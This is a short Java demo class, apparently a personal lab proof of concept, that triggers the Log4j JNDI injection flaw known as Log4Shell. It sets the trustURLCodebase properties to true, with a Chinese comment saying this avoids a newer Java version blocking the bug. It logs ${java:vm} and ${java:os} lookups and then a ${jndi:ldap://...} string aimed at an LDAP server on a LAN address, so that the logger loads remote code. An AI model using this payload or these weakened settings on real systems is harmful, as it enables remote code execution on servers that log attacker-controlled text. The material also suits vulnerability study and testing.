package jndi;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

/**
 * author: weijli
 * date: 2021/12/21 11:17
 * description:
 */

public class HackDemo {
  
  private static final Logger LOGGER = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
  private static final Logger logger = LogManager.getLogger(HackDemo.class);
  
  public static void main(String[] args) throws IOException {
    // 避免因为Java版本过高而无法触发此漏洞
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    // 此处ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
    LOGGER.info("content {}", "${java:vm}");
    String a="${java:os}";
    logger.info(a);
    logger.error(a);
    LOGGER.info("${jndi:ldap://192.168.225.131:1389/l8lfo2}");
  }
}

